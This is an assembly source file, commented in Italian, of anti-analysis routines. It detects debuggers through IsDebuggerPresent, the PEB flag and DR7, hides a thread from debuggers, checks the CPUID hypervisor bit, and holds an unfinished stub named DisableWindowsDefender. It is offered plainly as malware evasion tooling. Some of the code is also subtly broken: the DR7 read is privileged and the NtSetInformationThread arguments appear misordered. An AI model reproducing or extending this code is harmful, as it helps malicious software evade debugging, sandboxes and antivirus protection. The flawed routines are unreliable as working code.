section .text

global CheckDebugger
global HideFromDebugger
global DetectVirtualization
global DisableWindowsDefender

extern IsDebuggerPresent
extern NtSetInformationThread
extern GetCurrentThread
extern GetModuleHandleA
extern GetProcAddress

; Costanti
ThreadHideFromDebugger equ 0x11

section .data
    kernel32_name db "kernel32.dll", 0
    ntdll_name db "ntdll.dll", 0
    defender_name db "MsMpEng.exe", 0
    
section .text

; bool CheckDebugger(void)
CheckDebugger:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 32
    
    ; Controlla IsDebuggerPresent
    call    IsDebuggerPresent
    test    al, al
    jnz     .debugger_found
    
    ; Controlla BeingDebugged flag nel PEB
    mov     rax, gs:[60h]      ; Get PEB
    movzx   eax, byte [rax+2]  ; BeingDebugged flag
    test    al, al
    jnz     .debugger_found
    
    ; Controlla hardware breakpoints
    mov     rax, dr7
    test    rax, rax
    jnz     .debugger_found
    
    xor     rax, rax          ; No debugger found
    jmp     .exit
    
.debugger_found:
    mov     rax, 1
    
.exit:
    leave
    ret

; void HideFromDebugger(void)
HideFromDebugger:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 32
    
    ; Get current thread handle
    call    GetCurrentThread
    mov     rcx, rax
    
    ; Call NtSetInformationThread
    xor     rdx, rdx
    mov     r8, ThreadHideFromDebugger
    xor     r9, r9
    call    NtSetInformationThread
    
    leave
    ret

; bool DetectVirtualization(void)
DetectVirtualization:
    push    rbp
    mov     rbp, rsp
    
    ; Check CPUID
    mov     eax, 1
    cpuid
    test    ecx, (1 << 31)    ; Check hypervisor bit
    jnz     .vm_detected
    
    ; Check for common VM strings in memory
    ; TODO: Implementare ricerca stringhe VM
    
    xor     rax, rax          ; No VM detected
    jmp     .exit
    
.vm_detected:
    mov     rax, 1
    
.exit:
    leave
    ret

; bool DisableWindowsDefender(void)
DisableWindowsDefender:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 32
    
    ; TODO: Implementare disabilitazione Windows Defender
    ; Richiede privilegi elevati
    
    xor     rax, rax
    leave
    ret
